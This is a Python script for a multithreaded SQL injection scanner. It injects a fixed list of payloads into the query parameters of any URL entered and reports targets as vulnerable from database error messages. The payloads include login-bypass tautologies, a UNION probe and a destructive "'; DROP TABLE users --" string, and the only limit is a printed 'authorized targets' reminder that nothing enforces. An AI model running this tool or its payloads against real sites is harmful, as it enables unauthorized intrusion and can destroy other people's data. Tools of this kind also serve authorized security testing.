
import requests
import threading
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from colorama import Fore, Style

PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "' OR 'a'='a",
    "\" OR \"1\"=\"1",
    "' UNION SELECT NULL --",
    "'; DROP TABLE users --"
]

ERROR_PATTERNS = [
    "sql syntax",
    "mysql",
    "syntax error",
    "unclosed quotation",
    "database error",
    "sqlite error",
    "ora-",
    "postgresql"
]

THREADS = 5
RATE_LIMIT = 1
LOG_FILE = "sqli_scan_log.txt"


def log_result(text):
    with open(LOG_FILE, "a") as f:
        f.write(text + "\n")


def is_vulnerable(response_text):
    lower = response_text.lower()
    for error in ERROR_PATTERNS:
        if error in lower:
            return True
    return False


def inject_payload(url, param, payload):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)

    query[param] = payload

    new_query = urlencode(query, doseq=True)
    new_url = urlunparse(parsed._replace(query=new_query))

    try:
        response = requests.get(new_url, timeout=5)

        if is_vulnerable(response.text):
            result = f"[VULNERABLE] {new_url}"
            print(Fore.RED + result + Style.RESET_ALL)
            log_result(result)
        else:
            result = f"[SAFE] {new_url}"
            print(Fore.GREEN + result + Style.RESET_ALL)

    except Exception as e:
        result = f"[ERROR] {new_url} -> {e}"
        print(Fore.YELLOW + result + Style.RESET_ALL)
        log_result(result)

    time.sleep(RATE_LIMIT)


def scan_url(url):
    parsed = urlparse(url)
    params = parse_qs(parsed.query)

    if not params:
        print("No parameters found to test.")
        return

    threads = []

    for param in params:
        for payload in PAYLOADS:
            t = threading.Thread(target=inject_payload, args=(url, param, payload))
            threads.append(t)
            t.start()

            if len(threads) >= THREADS:
                for thread in threads:
                    thread.join()
                threads.clear()

    for thread in threads:
        thread.join()


def main():
    print("=== SQL Injection Scanner ===")
    print("Use only on authorized targets\n")

    url = input("Enter URL with parameters: ")
    scan_url(url)

    print("\nScan complete. Check log file.")


if __name__ == "__main__":
    main()
